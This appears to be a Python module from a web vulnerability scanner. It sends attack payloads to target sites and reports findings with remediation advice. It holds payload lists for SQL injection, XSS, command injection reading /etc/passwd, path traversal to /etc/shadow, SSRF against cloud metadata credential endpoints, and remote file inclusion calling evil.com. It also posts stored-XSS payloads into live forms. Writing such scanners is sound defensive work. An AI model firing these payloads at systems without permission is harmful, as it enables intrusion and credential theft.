"""Vulnerability checker module — active vulnerability detection.

Performs parameter-based injection testing (SQLi, XSS, command injection,
LFI/RFI, SSRF), plus CORS, cookie, open redirect, CSRF, directory listing,
HTTP methods checks, and known-tech CVE lookup.
"""

import asyncio
import re
import time
import urllib.parse
from typing import Any

import httpx

from scanner.config import config
from scanner.logger import logger
from scanner.models import (
    Asset,
    BaseModule,
    Finding,
    ModuleResult,
    Severity,
    VulnCategory,
)


# ── Payload banks ────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "1' AND SLEEP(3)--",
]

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*\Wmysqli?_",
    r"ORA-\d{5}",
    r"PostgreSQL.*ERROR",
    r"Driver\..*SQL[\-\_\ ]*Server",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\).*failed",
    r"unterminated.*quote",
    r"syntax error at or near",
    r"SQLite3::query",
    r"SQLSTATE\[",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "'><svg/onload=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
]

COMMAND_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "$(id)",
    "`id`",
    "|| id",
    "; cat /etc/passwd",
]

COMMAND_INJECTION_PATTERNS = [
    r"uid=\d+.*gid=\d+",
    r"root:.*:0:0:",
    r"www-data:",
    r"bin/bash",
    r"bin/sh",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
]

LFI_PATTERNS = [
    r"root:.*:0:0:",
    r"\[extensions\]",  # win.ini
    r"/bin/bash",
    r"/bin/sh",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.txt",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://0x7f000001",
]

SSRF_INDICATORS = [
    "ami-id",
    "instance-id",
    "meta-data",
    "computeMetadata",
    "iam/security-credentials",
    "hostname",
]

DIRECTORY_LISTING_PATTERNS = [
    r"<title>Index of /",
    r"<h1>Index of /",
    r'<a href="\?C=',
    r"Parent Directory",
    r"Directory listing for",
    r"Directory Listing For",
]


class VulnChecker(BaseModule):
    """Active vulnerability scanning — injection testing and configuration checks."""

    @property
    def name(self) -> str:
        return "vuln_checker"

    @property
    def description(self) -> str:
        return "Active vulnerability testing (SQLi, XSS, injection, SSRF, takeover checks)"

    async def run(self, target: str, options: dict[str, Any] | None = None) -> ModuleResult:
        opts = options or {}
        start = time.time()
        assets: list[Asset] = []
        findings: list[Finding] = []
        errors: list[str] = []
        raw_output: dict[str, Any] = {}

        discovered_assets: list[dict] = opts.get("discovered_assets", [])
        exclude_paths: list[str] = opts.get("exclude_paths", [])
        log = logger.bind(target=target)
        log.info("Starting vulnerability check", asset_count=len(discovered_assets))

        base_url = target if target.startswith("http") else f"https://{target}"

        # Collect endpoints with query params for injection testing
        endpoints: list[str] = self._collect_endpoints(discovered_assets, base_url, exclude_paths)

        async with httpx.AsyncClient(
            timeout=config.http_timeout,
            follow_redirects=False,
            verify=False,
            headers={"User-Agent": config.http_user_agent},
        ) as client:
            # ── Passive / config checks ──
            web_findings = await self._check_common_web_vulns(base_url, client)
            findings.extend(web_findings)
            raw_output["web_vulns"] = len(web_findings)

            csrf_findings = await self._check_csrf(base_url, client)
            findings.extend(csrf_findings)
            raw_output["csrf_checks"] = len(csrf_findings)

            dir_findings = await self._check_directory_listing(base_url, client)
            findings.extend(dir_findings)
            raw_output["directory_listing"] = len(dir_findings)

            methods_findings = await self._check_http_methods(base_url, client)
            findings.extend(methods_findings)
            raw_output["http_methods"] = len(methods_findings)

            # ── Active injection testing on discovered endpoints ──
            sqli_findings = await self._test_sqli(endpoints, client)
            findings.extend(sqli_findings)
            raw_output["sqli"] = len(sqli_findings)

            xss_findings = await self._test_xss(endpoints, client)
            findings.extend(xss_findings)
            raw_output["xss"] = len(xss_findings)

            cmdi_findings = await self._test_command_injection(endpoints, client)
            findings.extend(cmdi_findings)
            raw_output["command_injection"] = len(cmdi_findings)

            lfi_findings = await self._test_lfi(endpoints, client)
            findings.extend(lfi_findings)
            raw_output["lfi"] = len(lfi_findings)

            ssrf_findings = await self._test_ssrf(endpoints, client)
            findings.extend(ssrf_findings)
            raw_output["ssrf"] = len(ssrf_findings)

            rfi_findings = await self._test_rfi(endpoints, client)
            findings.extend(rfi_findings)
            raw_output["rfi"] = len(rfi_findings)

            stored_xss_findings = await self._test_stored_xss(base_url, endpoints, client)
            findings.extend(stored_xss_findings)
            raw_output["stored_xss"] = len(stored_xss_findings)

            path_trav_findings = await self._test_path_traversal(endpoints, client)
            findings.extend(path_trav_findings)
            raw_output["path_traversal"] = len(path_trav_findings)

        # ── Known-tech CVE lookup ──
        tech_assets = [a for a in discovered_assets if a.get("type") == "TECHNOLOGY"]
        for tech in tech_assets:
            cve_findings = await self._check_technology_cves(
                tech.get("value", ""), tech.get("metadata", {})
            )
            findings.extend(cve_findings)
        raw_output["tech_cves"] = len(findings) - sum(raw_output.get(k, 0) for k in raw_output)

        log.info("Vulnerability check completed", findings=len(findings))

        return ModuleResult(
            module_name=self.name,
            assets=assets,
            findings=findings,
            raw_output=raw_output,
            errors=errors,
            duration_seconds=time.time() - start,
        )

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _collect_endpoints(
        self,
        discovered_assets: list[dict],
        base_url: str,
        exclude_paths: list[str],
    ) -> list[str]:
        """Collect URLs with query parameters from crawled endpoints."""
        endpoints: list[str] = []
        seen: set[str] = set()

        for asset in discovered_assets:
            if asset.get("type") != "ENDPOINT":
                continue
            url = asset.get("value", "")
            if "?" not in url:
                continue
            parsed = urllib.parse.urlparse(url)
            key = f"{parsed.path}?{parsed.query}"
            if key in seen:
                continue
            seen.add(key)

            skip = False
            for exc in exclude_paths:
                if exc in parsed.path:
                    skip = True
                    break
            if not skip:
                endpoints.append(url)

        # If no param-based endpoints found, create synthetic test URLs
        if not endpoints:
            endpoints.append(f"{base_url}/?q=test")

        # Limit to 15 endpoints max to keep scan time reasonable
        return endpoints[:15]

    @staticmethod
    def _inject_payload(url: str, payload: str) -> list[str]:
        """Return URLs with each query parameter replaced by payload."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        urls: list[str] = []
        for param in params:
            new_params = {**params}
            new_params[param] = [payload]
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            urls.append(urllib.parse.urlunparse(parsed._replace(query=new_query)))
        return urls

    # ── SQL Injection ────────────────────────────────────────────────────────

    async def _test_sqli(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []
        tested: set[str] = set()

        for endpoint in endpoints:
            for payload in SQLI_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    if url in tested:
                        continue
                    tested.add(url)
                    try:
                        start_time = time.time()
                        resp = await client.get(url)
                        elapsed = time.time() - start_time
                        body = resp.text

                        # Error-based SQLi detection
                        for pattern in SQLI_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                findings.append(
                                    Finding(
                                        title="Potential SQL Injection",
                                        severity=Severity.CRITICAL,
                                        category=VulnCategory.SQL_INJECTION,
                                        description=(
                                            "SQL error message detected in response when injecting "
                                            "payload into URL parameter. This suggests the application "
                                            "may be vulnerable to SQL injection."
                                        ),
                                        solution=(
                                            "Use parameterised queries or prepared statements. "
                                            "Validate and sanitise all user input."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nPattern matched: {pattern}",
                                        references=[
                                            "https://owasp.org/www-community/attacks/SQL_Injection",
                                        ],
                                    )
                                )
                                return findings  # One SQLi finding per scan is enough

                        # Time-based blind SQLi detection
                        if "SLEEP" in payload.upper() or "PG_SLEEP" in payload.upper():
                            if elapsed >= 2.5:
                                findings.append(
                                    Finding(
                                        title="Potential Blind SQL Injection (Time-Based)",
                                        severity=Severity.CRITICAL,
                                        category=VulnCategory.SQL_INJECTION,
                                        description=(
                                            "The server response was significantly delayed when injecting "
                                            "a time-based SQL payload, suggesting blind SQL injection. "
                                            f"Response took {elapsed:.1f}s (expected delay from SLEEP)."
                                        ),
                                        solution=(
                                            "Use parameterised queries or prepared statements. "
                                            "Validate and sanitise all user input."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nResponse time: {elapsed:.2f}s",
                                        references=[
                                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                                        ],
                                    )
                                )
                                return findings
                    except Exception:
                        pass
        return findings

    # ── Reflected XSS ────────────────────────────────────────────────────────

    async def _test_xss(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []
        tested: set[str] = set()

        for endpoint in endpoints:
            for payload in XSS_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    if url in tested:
                        continue
                    tested.add(url)
                    try:
                        resp = await client.get(url)
                        if payload in resp.text:
                            findings.append(
                                Finding(
                                    title="Potential Reflected XSS",
                                    severity=Severity.HIGH,
                                    category=VulnCategory.XSS_REFLECTED,
                                    description=(
                                        "User-supplied input is reflected in the HTTP response "
                                        "without proper encoding or sanitisation, allowing "
                                        "execution of arbitrary JavaScript in the victim's browser."
                                    ),
                                    solution=(
                                        "Encode all user-supplied output using context-appropriate "
                                        "encoding (HTML entity, JavaScript, URL). Implement Content "
                                        "Security Policy (CSP)."
                                    ),
                                    affected_component=endpoint,
                                    evidence=f"Payload: {payload}\nReflected in response body.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/xss/",
                                    ],
                                )
                            )
                            return findings
                    except Exception:
                        pass
        return findings

    # ── Stored XSS ───────────────────────────────────────────────────────────

    STORED_XSS_PAYLOADS = [
        '<img src=x onerror=alert("STORED_XSS_TEST_1")>',
        '"><svg/onload=confirm("STORED_XSS_TEST_2")>',
        "<details open ontoggle=alert('STORED_XSS_TEST_3')>x</details>",
        '<a href="javascript:alert(\'STORED_XSS_TEST_4\')">click</a>',
        '<body onload=alert("STORED_XSS_TEST_5")>',
    ]

    async def _test_stored_xss(
        self, base_url: str, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        """Test for stored XSS by submitting payloads to forms and checking persistence.

        Flow:
        1. Crawl pages for forms with POST method
        2. Submit XSS payloads into text input fields
        3. Re-fetch the page to check if payload persists (stored)
        """
        findings: list[Finding] = []
        tested_forms: set[str] = set()

        # Gather pages to scan for forms
        pages_to_check = [base_url]
        pages_to_check.extend(
            ep.split("?")[0] for ep in endpoints[:20]
        )
        seen_pages: set[str] = set()

        for page_url in pages_to_check:
            if page_url in seen_pages:
                continue
            seen_pages.add(page_url)

            try:
                resp = await client.get(page_url, follow_redirects=True)
                if resp.status_code != 200:
                    continue

                # Extract POST forms
                forms = re.findall(
                    r"<form([^>]*)>(.*?)</form>",
                    resp.text, re.DOTALL | re.IGNORECASE,
                )

                for form_attrs, form_body in forms:
                    if "post" not in form_attrs.lower():
                        continue

                    # Get form action
                    action_match = re.search(
                        r'action=["\']([^"\']+)', form_attrs, re.IGNORECASE
                    )
                    action = action_match.group(1) if action_match else page_url
                    if not action.startswith("http"):
                        action = urllib.parse.urljoin(page_url, action)

                    form_key = action
                    if form_key in tested_forms:
                        continue
                    tested_forms.add(form_key)

                    # Extract input fields
                    inputs = re.findall(
                        r'<input([^>]*)>', form_body, re.IGNORECASE
                    )
                    textarea_names = re.findall(
                        r'<textarea[^>]*name=["\']([^"\']+)', form_body, re.IGNORECASE
                    )

                    text_fields: list[tuple[str, str]] = []  # (name, type)
                    hidden_fields: dict[str, str] = {}

                    for inp_attrs in inputs:
                        name_match = re.search(
                            r'name=["\']([^"\']+)', inp_attrs, re.IGNORECASE
                        )
                        type_match = re.search(
                            r'type=["\']([^"\']+)', inp_attrs, re.IGNORECASE
                        )
                        value_match = re.search(
                            r'value=["\']([^"\']*)', inp_attrs, re.IGNORECASE
                        )
                        if not name_match:
                            continue
                        fname = name_match.group(1)
                        ftype = (type_match.group(1) if type_match else "text").lower()

                        if ftype == "hidden":
                            hidden_fields[fname] = value_match.group(1) if value_match else ""
                        elif ftype in ("text", "search", "url", "email", ""):
                            text_fields.append((fname, ftype))

                    for tname in textarea_names:
                        text_fields.append((tname, "textarea"))

                    if not text_fields:
                        continue

                    # Test each payload
                    for payload in self.STORED_XSS_PAYLOADS:
                        form_data: dict[str, str] = dict(hidden_fields)
                        for fname, _ in text_fields:
                            form_data[fname] = payload

                        try:
                            # Submit form
                            post_resp = await client.post(
                                action, data=form_data, follow_redirects=True
                            )

                            # Re-fetch the originating page to see if payload persists
                            await asyncio.sleep(0.5)
                            check_resp = await client.get(
                                page_url, follow_redirects=True
                            )

                            if payload in check_resp.text:
                                field_names = ", ".join(f[0] for f in text_fields)
                                findings.append(
                                    Finding(
                                        title="Potential Stored XSS",
                                        severity=Severity.HIGH,
                                        category=VulnCategory.XSS_STORED,
                                        description=(
                                            "A submitted XSS payload was stored and rendered on "
                                            "a subsequent page load without proper sanitisation. "
                                            "This allows persistent JavaScript execution in "
                                            "other users' browsers."
                                        ),
                                        solution=(
                                            "Sanitise all user input before storage using a "
                                            "whitelist-based HTML sanitiser (e.g. DOMPurify). "
                                            "Apply context-appropriate output encoding. "
                                            "Implement Content Security Policy (CSP)."
                                        ),
                                        affected_component=action,
                                        evidence=(
                                            f"Form action: {action}\n"
                                            f"Fields: {field_names}\n"
                                            f"Payload: {payload}\n"
                                            f"Payload persisted in page body after re-fetch."
                                        ),
                                        references=[
                                            "https://owasp.org/www-community/attacks/xss/",
                                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                                        ],
                                    )
                                )
                                return findings
                        except Exception:
                            pass

            except Exception:
                pass

        return findings

    # ── Command Injection ────────────────────────────────────────────────────

    async def _test_command_injection(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []

        for endpoint in endpoints:
            for payload in COMMAND_INJECTION_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        for pattern in COMMAND_INJECTION_PATTERNS:
                            if re.search(pattern, body):
                                findings.append(
                                    Finding(
                                        title="Potential OS Command Injection",
                                        severity=Severity.CRITICAL,
                                        category=VulnCategory.COMMAND_INJECTION,
                                        description=(
                                            "OS command output detected in response. The application "
                                            "may pass user input to system commands without sanitisation."
                                        ),
                                        solution=(
                                            "Never pass user input directly to OS commands. "
                                            "Use parameterised APIs and strict input validation."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nPattern matched: {pattern}",
                                        references=[
                                            "https://owasp.org/www-community/attacks/Command_Injection",
                                        ],
                                    )
                                )
                                return findings
                    except Exception:
                        pass
        return findings

    # ── Local File Inclusion (LFI) ───────────────────────────────────────────

    async def _test_lfi(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []

        for endpoint in endpoints:
            for payload in LFI_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        for pattern in LFI_PATTERNS:
                            if re.search(pattern, body):
                                findings.append(
                                    Finding(
                                        title="Potential Local File Inclusion (LFI)",
                                        severity=Severity.HIGH,
                                        category=VulnCategory.LFI,
                                        description=(
                                            "The application appears to include local files based "
                                            "on user input. OS-level files were detected in the response."
                                        ),
                                        solution=(
                                            "Validate file paths against a whitelist. "
                                            "Never allow user input to control file paths directly."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nPattern matched: {pattern}",
                                        references=[
                                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                                        ],
                                    )
                                )
                                return findings
                    except Exception:
                        pass
        return findings

    # ── Server-Side Request Forgery (SSRF) ───────────────────────────────────

    async def _test_ssrf(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []

        for endpoint in endpoints:
            for payload in SSRF_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    try:
                        resp = await client.get(url)
                        body = resp.text.lower()
                        for indicator in SSRF_INDICATORS:
                            if indicator.lower() in body:
                                findings.append(
                                    Finding(
                                        title="Potential SSRF (Server-Side Request Forgery)",
                                        severity=Severity.HIGH,
                                        category=VulnCategory.SSRF,
                                        description=(
                                            "Internal service response detected when injecting "
                                            "internal URLs into a parameter. The server may be "
                                            "making requests to user-controlled URLs."
                                        ),
                                        solution=(
                                            "Validate and whitelist URLs. Block requests to "
                                            "internal/private IP ranges. Use network segmentation."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nIndicator: {indicator}",
                                        references=[
                                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                                        ],
                                    )
                                )
                                return findings
                    except Exception:
                        pass
        return findings

    # ── Remote File Inclusion (RFI) ──────────────────────────────────────────

    async def _test_rfi(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        """Test for Remote File Inclusion vulnerabilities."""
        findings: list[Finding] = []

        rfi_indicators = [
            r"<\?php",
            r"<%.*%>",
            r"root:.*:0:0:",
            r"\\[boot loader\\]",
            r"\\[operating systems\\]",
            r"<title>Google</title>",
            r"<html",
        ]

        for endpoint in endpoints:
            for payload in RFI_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        # Check if the response contains content from the remote file
                        for indicator in rfi_indicators:
                            if re.search(indicator, body, re.IGNORECASE):
                                # Verify it's not a normal page element
                                # by checking the payload domain appears or response changed significantly
                                findings.append(
                                    Finding(
                                        title="Potential Remote File Inclusion (RFI)",
                                        severity=Severity.CRITICAL,
                                        category=VulnCategory.RFI,
                                        description=(
                                            "The application appears to include remote files based "
                                            "on user input. Remote content indicators were detected "
                                            "in the response after injecting a remote URL."
                                        ),
                                        solution=(
                                            "Never include files based on user input. "
                                            "Use a whitelist for allowed file paths. "
                                            "Disable allow_url_include in PHP configuration."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nIndicator matched: {indicator}",
                                        references=[
                                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion",
                                        ],
                                    )
                                )
                                return findings
                    except Exception:
                        pass
        return findings

    # ── Path Traversal ───────────────────────────────────────────────────────

    PATH_TRAVERSAL_PAYLOADS = [
        "....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..%5c..%5c..%5c..%5cwindows\\win.ini",
        "../../../../../../../etc/shadow",
        "../../../../../../../proc/self/environ",
        "..\\..\\..\\..\\boot.ini",
    ]

    PATH_TRAVERSAL_PATTERNS = [
        r"root:.*:0:0:",
        r"\[boot loader\]",
        r"\[extensions\]",
        r"\[fonts\]",
        r"DOCUMENT_ROOT=",
        r"HTTP_USER_AGENT=",
        r"daemon:.*:/usr/sbin",
        r"bin:.*:/bin",
    ]

    async def _test_path_traversal(
        self, endpoints: list[str], client: httpx.AsyncClient
    ) -> list[Finding]:
        """Dedicated path traversal test with encoding bypass techniques."""
        findings: list[Finding] = []

        for endpoint in endpoints:
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                injected_urls = self._inject_payload(endpoint, payload)
                for url in injected_urls:
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        for pattern in self.PATH_TRAVERSAL_PATTERNS:
                            if re.search(pattern, body):
                                findings.append(
                                    Finding(
                                        title="Path Traversal Vulnerability",
                                        severity=Severity.HIGH,
                                        category=VulnCategory.PATH_TRAVERSAL,
                                        description=(
                                            "The application is vulnerable to path traversal attacks "
                                            "using encoding bypass techniques. Sensitive system files "
                                            "were accessible through manipulated file path parameters."
                                        ),
                                        solution=(
                                            "Validate and canonicalize file paths. Use a whitelist of "
                                            "allowed files. Never use user input directly in file operations. "
                                            "Implement proper input decoding before validation."
                                        ),
                                        affected_component=endpoint,
                                        evidence=f"Payload: {payload}\nPattern matched: {pattern}",
                                        references=[
                                            "https://owasp.org/www-community/attacks/Path_Traversal",
                                        ],
                                    )
                                )
                                return findings
                    except Exception:
                        pass
        return findings

    # ── CSRF Detection ────────────────────────────────────────────────────────

    async def _check_csrf(
        self, base_url: str, client: httpx.AsyncClient
    ) -> list[Finding]:
        """Check for missing CSRF tokens in forms."""
        findings: list[Finding] = []
        try:
            resp = await client.get(base_url, follow_redirects=True)
            if resp.status_code != 200:
                return findings

            forms = re.findall(
                r"<form[^>]*method=['\"]?post['\"]?[^>]*>.*?</form>",
                resp.text, re.DOTALL | re.IGNORECASE,
            )
            for form in forms:
                has_csrf = any(
                    token in form.lower()
                    for token in [
                        "csrf", "_token", "authenticity_token",
                        "csrfmiddlewaretoken", "__requestverificationtoken",
                    ]
                )
                if not has_csrf:
                    action_match = re.search(r'action=["\']([^"\']+)', form, re.IGNORECASE)
                    action = action_match.group(1) if action_match else base_url

                    findings.append(
                        Finding(
                            title="Missing CSRF Token in Form",
                            severity=Severity.MEDIUM,
                            category=VulnCategory.CSRF,
                            description=(
                                "A POST form was found without a CSRF protection token. "
                                "This may allow cross-site request forgery attacks."
                            ),
                            solution=(
                                "Include a CSRF token in all state-changing forms. "
                                "Verify the token server-side on each request."
                            ),
                            affected_component=action,
                            evidence=f"Form without CSRF token found at {base_url}",
                        )
                    )
                    break  # Report once
        except Exception:
            pass
        return findings

    # ── Directory Listing ────────────────────────────────────────────────────

    async def _check_directory_listing(
        self, base_url: str, client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []
        test_dirs = ["/", "/images/", "/uploads/", "/assets/", "/static/", "/files/", "/css/", "/js/"]

        for path in test_dirs:
            try:
                url = f"{base_url}{path}"
                resp = await client.get(url, follow_redirects=True)
                body = resp.text
                for pattern in DIRECTORY_LISTING_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append(
                            Finding(
                                title=f"Directory Listing Enabled: {path}",
                                severity=Severity.MEDIUM,
                                category=VulnCategory.DIRECTORY_LISTING,
                                description=(
                                    f"Directory listing is enabled at {url}. "
                                    f"This exposes the internal structure and files."
                                ),
                                solution="Disable directory listing in the web server configuration.",
                                affected_component=url,
                                evidence=f"Pattern '{pattern}' matched in response body.",
                            )
                        )
                        break
            except Exception:
                pass
        return findings

    # ── HTTP Methods ─────────────────────────────────────────────────────────

    async def _check_http_methods(
        self, base_url: str, client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []
        dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT"]

        try:
            resp = await client.request("OPTIONS", base_url)
            allow = resp.headers.get("allow", "")
            if not allow:
                return findings

            allowed = [m.strip().upper() for m in allow.split(",")]
            risky = [m for m in dangerous_methods if m in allowed]

            if risky:
                findings.append(
                    Finding(
                        title=f"Dangerous HTTP Methods Allowed: {', '.join(risky)}",
                        severity=Severity.MEDIUM,
                        category=VulnCategory.HTTP_METHODS,
                        description=(
                            f"The server allows potentially dangerous HTTP methods: {', '.join(risky)}. "
                            f"TRACE can lead to XST attacks; PUT/DELETE may allow file manipulation."
                        ),
                        solution=(
                            "Disable unused HTTP methods. Only allow GET, POST, HEAD, OPTIONS "
                            "unless explicitly required."
                        ),
                        affected_component=base_url,
                        evidence=f"Allow header: {allow}",
                    )
                )

            try:
                trace_resp = await client.request("TRACE", base_url)
                if trace_resp.status_code == 200 and "TRACE" in trace_resp.text.upper():
                    if not any(f.category == VulnCategory.HTTP_METHODS for f in findings):
                        findings.append(
                            Finding(
                                title="TRACE Method Enabled (XST Risk)",
                                severity=Severity.MEDIUM,
                                category=VulnCategory.HTTP_METHODS,
                                description="TRACE method is active and echoes the request back.",
                                solution="Disable the TRACE method on the web server.",
                                affected_component=base_url,
                                evidence="TRACE request returned 200 with echoed content.",
                            )
                        )
            except Exception:
                pass

        except Exception:
            pass
        return findings

    # ── Common Web Vulns (CORS, cookies, open redirect, HTTPS) ───────────────

    async def _check_common_web_vulns(
        self, base_url: str, client: httpx.AsyncClient
    ) -> list[Finding]:
        findings: list[Finding] = []

        # HTTPS redirect check
        try:
            http_url = base_url.replace("https://", "http://")
            resp = await client.get(http_url)
            if resp.status_code not in (301, 302, 307, 308):
                findings.append(
                    Finding(
                        title="HTTP to HTTPS Redirect Missing",
                        severity=Severity.MEDIUM,
                        category=VulnCategory.SECURITY_HEADERS,
                        description=f"HTTP request to {http_url} does not redirect to HTTPS.",
                        solution="Configure HTTP to HTTPS redirect on the web server.",
                        affected_component=http_url,
                    )
                )
            elif "https://" not in resp.headers.get("location", ""):
                findings.append(
                    Finding(
                        title="HTTP Redirect Does Not Point to HTTPS",
                        severity=Severity.MEDIUM,
                        category=VulnCategory.SECURITY_HEADERS,
                        description="HTTP redirects but not to an HTTPS URL.",
                        solution="Ensure HTTP redirects to HTTPS.",
                        affected_component=http_url,
                    )
                )
        except Exception:
            pass

        # Open redirect
        try:
            test_url = f"{base_url}/?redirect=https://evil.com&url=https://evil.com&next=https://evil.com"
            resp = await client.get(test_url)
            location = resp.headers.get("location", "")
            if "evil.com" in location:
                findings.append(
                    Finding(
                        title="Potential Open Redirect",
                        severity=Severity.MEDIUM,
                        category=VulnCategory.OPEN_REDIRECT,
                        description="The application may be vulnerable to open redirect attacks.",
                        solution="Validate and whitelist redirect URLs.",
                        affected_component=base_url,
                    )
                )
        except Exception:
            pass

        # CORS misconfiguration
        try:
            resp = await client.get(base_url, headers={"Origin": "https://evil.com"})
            acao = resp.headers.get("access-control-allow-origin", "")
            if acao == "*" or acao == "https://evil.com":
                findings.append(
                    Finding(
                        title="CORS Misconfiguration",
                        severity=Severity.HIGH if "evil.com" in acao else Severity.MEDIUM,
                        category=VulnCategory.CORS_MISCONFIG,
                        description=f"CORS allows requests from any/untrusted origin: {acao}",
                        solution="Restrict CORS to trusted domains only.",
                        affected_component=base_url,
                    )
                )
        except Exception:
            pass

        # Cookie security
        try:
            resp = await client.get(base_url, follow_redirects=True)
            for cookie_header in resp.headers.get_list("set-cookie"):
                cookie_lower = cookie_header.lower()
                cookie_name = cookie_header.split("=")[0].strip()

                if "secure" not in cookie_lower:
                    findings.append(
                        Finding(
                            title=f"Cookie Missing Secure Flag: {cookie_name}",
                            severity=Severity.LOW,
                            category=VulnCategory.COOKIE_SECURITY,
                            description=f"Cookie '{cookie_name}' is missing the Secure flag.",
                            solution="Add the 'Secure' flag to all cookies.",
                            affected_component=base_url,
                        )
                    )

                if "httponly" not in cookie_lower and "session" in cookie_lower:
                    findings.append(
                        Finding(
                            title=f"Session Cookie Missing HttpOnly: {cookie_name}",
                            severity=Severity.MEDIUM,
                            category=VulnCategory.COOKIE_SECURITY,
                            description=f"Session cookie '{cookie_name}' is missing HttpOnly flag.",
                            solution="Add the 'HttpOnly' flag to session cookies.",
                            affected_component=base_url,
                        )
                    )
        except Exception:
            pass

        return findings

    # ── Known-Tech CVE Lookup ────────────────────────────────────────────────

    async def _check_technology_cves(
        self, tech_name: str, metadata: dict[str, Any]
    ) -> list[Finding]:
        findings: list[Finding] = []

        known_issues: dict[str, list[dict[str, Any]]] = {
            "WordPress": [
                {
                    "title": "WordPress Core – Keep Updated",
                    "severity": Severity.INFO,
                    "description": "WordPress detected. Ensure it is running the latest version.",
                    "solution": "Update WordPress core, themes, and plugins regularly.",
                }
            ],
            "PHP": [
                {
                    "title": "PHP Detected – Version Check Recommended",
                    "severity": Severity.INFO,
                    "description": "PHP detected on server. Old PHP versions have known CVEs.",
                    "solution": "Ensure PHP is updated to a supported version (8.1+).",
                }
            ],
            "Joomla": [
                {
                    "title": "Joomla CMS Detected – Keep Updated",
                    "severity": Severity.INFO,
                    "description": "Joomla detected. Outdated versions have critical RCE CVEs.",
                    "solution": "Update Joomla to the latest stable release.",
                }
            ],
            "Drupal": [
                {
                    "title": "Drupal CMS Detected – Keep Updated",
                    "severity": Severity.INFO,
                    "description": "Drupal detected. Drupalgeddon and similar RCE vulns affect old versions.",
                    "solution": "Update Drupal core and contributed modules.",
                }
            ],
            "Apache": [
                {
                    "title": "Apache Web Server – Version Exposure",
                    "severity": Severity.LOW,
                    "description": "Apache detected. Exposed server versions aid attackers.",
                    "solution": "Set 'ServerTokens Prod' to hide version details.",
                }
            ],
            "Nginx": [
                {
                    "title": "Nginx Web Server – Version Exposure",
                    "severity": Severity.LOW,
                    "description": "Nginx detected. Exposed server versions aid attackers.",
                    "solution": "Set 'server_tokens off' to hide version details.",
                }
            ],
        }

        issues = known_issues.get(tech_name, [])
        for issue in issues:
            findings.append(
                Finding(
                    title=issue["title"],
                    severity=issue["severity"],
                    category=VulnCategory.OUTDATED_SOFTWARE,
                    description=issue["description"],
                    solution=issue["solution"],
                    affected_component=tech_name,
                )
            )
